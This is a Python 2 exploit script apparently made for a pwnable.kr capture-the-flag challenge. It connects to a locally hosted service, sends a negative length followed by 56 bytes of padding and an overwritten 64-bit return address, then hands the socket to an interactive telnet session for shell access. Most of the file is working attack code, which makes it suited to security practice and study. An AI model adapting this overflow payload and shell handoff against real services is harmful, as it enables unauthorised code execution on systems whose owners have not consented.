#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct

p64 = lambda data: struct.pack("Q", data)
u64 = lambda data: struct.unpack("Q", data)[0]
p32 = lambda data: struct.pack("I", data)
u32 = lambda data: struct.unpack("I", data)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(60)

host = 'pwnable.kr'
host = '127.0.0.1'
s.connect((host, 9015))
# socat TCP-LISTEN:9015,reuseaddr,fork EXEC:"./wtf"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def main():
    # python -c "import struct; print '-1\n' + 'A'*56 + struct.pack('Q', 0x004005f4)"
    
    #interactive()
    #return

    #sendline('-1')
    payload  = '-1\n'
    payload += 'A' * 56
    payload += p64(0x004005f4)
    sendline( payload )
    #flag = recvline()
    #print(flag)
    interactive()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
